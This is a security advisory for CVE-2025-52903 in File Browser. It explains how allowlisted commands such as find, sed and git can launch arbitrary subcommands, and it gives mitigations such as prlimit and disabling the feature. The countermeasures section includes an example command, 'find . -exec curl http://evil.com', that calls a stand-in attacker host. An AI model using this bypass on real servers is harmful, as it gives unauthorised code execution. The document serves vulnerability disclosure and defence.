# filebrowser Allows Shell Commands to Spawn Other Commands

**GHSA**: GHSA-3q2w-42mv-cph4 | **CVE**: CVE-2025-52903 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-77, CWE-88, CWE-183, CWE-749

**Affected Packages**:
- **github.com/filebrowser/filebrowser/v2** (go): < 2.33.10
- **github.com/filebrowser/filebrowser** (go): <= 1.11.0

## Description

## Summary ##

The *Command Execution* feature of File Browser only allows the execution of shell command which have been predefined on a user-specific allowlist. Many tools allow the execution of arbitrary different commands, rendering this limitation void.

## Impact ##

The concrete impact depends on the commands being granted to the attacker, but the large number of standard commands allowing the execution of subcommands makes it likely that every user having the `Execute commands` permissions can exploit this vulnerability. Everyone who can exploit it will have full code execution rights with the *uid* of the server process.

## Vulnerability Description ##

Many Linux commands allow the execution of arbitrary different commands. For example, if a user is authorized to run only the `find` command and nothing else, this restriction can be circumvented by using the `-exec` flag.

Some common commands having the ability to launch external commands and which are included in the official container image of Filebrowser are listed below. The website <https://gtfobins.github.io> gives a comprehensive overview:

* <https://gtfobins.github.io/gtfobins/cpio>
* <https://gtfobins.github.io/gtfobins/find>
* <https://gtfobins.github.io/gtfobins/sed>
* <https://gtfobins.github.io/gtfobins/git>
* <https://gtfobins.github.io/gtfobins/env>

As a prerequisite, an attacker needs an account with the `Execute Commands` permission and some permitted commands.

## Proof of Concept ##

The following screenshot demonstrates, how this can be used to issue a network call to an external server:

![image](https://github.com/user-attachments/assets/02ef0833-79ee-40f7-87b8-bbb3fe102eab)

## Recommended Countermeasures ##

Until this issue is fixed, we recommend to completely disable `Execute commands` for all accounts. Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application's configuration.

The `prlimit` command can be used to prevent the execution of subcommands:

```bash
$ find . -exec curl http://evil.com {} \;
<HTML>
<HEAD>
[...]

$ prlimit --nproc=0 find . -exec curl http://evil.com {} \;
find: cannot fork: Resource temporarily unavailable
```

It should be prepended to any command executed in the context of the application. `prlimit` can be used for containerized deployments as well as for bare-metal ones.

WARNING: Note that this does prevent any unexpected behavior from the authorized command. For example, the `find` command can also delete files directly via its `-delete` flag.

As a defense-in-depth measure, Filebrowser should provide an additional container image based on a *distroless* base image.

## Timeline ##

* `2025-03-26` Identified the vulnerability in version 2.32.0
* `2025-06-25` Uploaded advisories to the project's GitHub repository
* `2025-06-25` CVE ID assigned by GitHub
* `2025-06-25` A patch version has been pushed to disable the feature for all existent installations, and making it **opt-in**. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on https://github.com/filebrowser/filebrowser/issues/5199.

## References ##

* [prlimit](https://manpages.debian.org/bookworm/util-linux/prlimit.1.en.html)
* ["Distroless" Container Images.](https://github.com/GoogleContainerTools/distroless)
* [Original Advisory](https://github.com/sbaresearch/advisories/tree/public/2025/SBA-ADV-20250326-02_Filebrowser_Shell_Commands_Can_Spawn_Other_Commands)
 
## Credits ##

* Mathias Tausig ([SBA Research](https://www.sba-research.org/))
